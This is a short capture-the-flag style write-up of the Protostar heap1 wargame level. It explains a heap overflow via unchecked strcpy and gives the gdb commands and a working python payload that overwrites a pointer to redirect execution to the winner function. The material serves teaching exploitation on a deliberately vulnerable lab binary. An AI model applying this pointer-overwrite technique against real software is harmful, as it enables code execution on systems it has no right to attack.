**Heap1**

We need to use a heap overflow to solve this challenge.

strcpy doesn't specify the argument length, so we can copy any size string we want.

After reading on how the heap works\* we know malloc will insert an address into the heap to point to the value of name.
Using the first strcpy we can overwrite i2's name address.
Using the second strcpy we can overwrite the bytes that will be written into said address.

We can use this to write eip's address on the stack using the first strcpy and changing it to winner's address using the second strcpy.


**Winner's Address**

```diff
$ readelf -s heap1 | grep winner
    55: 08048494    37 FUNC    GLOBAL DEFAULT   14 winner
```


**Eip's Address**

```diff
$ gdb heap1
$ b (in main)
$ r a a
$ info frame
```


**The Exploit**

This did not work first hand, I had to subtract 20 off eip's address to get the real location of eip (The stack shifted a few bytes).

```diff
(gdb) r $(python -c "from struct import pack;print 'AAAA'*5 + pack('<I', 0xbffffe20 - 20) + ' ' + pack('<I', 0x08048494)")
Starting program: /opt/protostar/bin/heap1 $(python -c "from struct import pack;print 'AAAA'*5 + pack('<I', 0xbffffe20 - 20) + ' ' + pack('<I', 0x08048494)")
and that's a wrap folks!
and we have a winner @ 1585664176

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) 
```


\* Source - https://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap
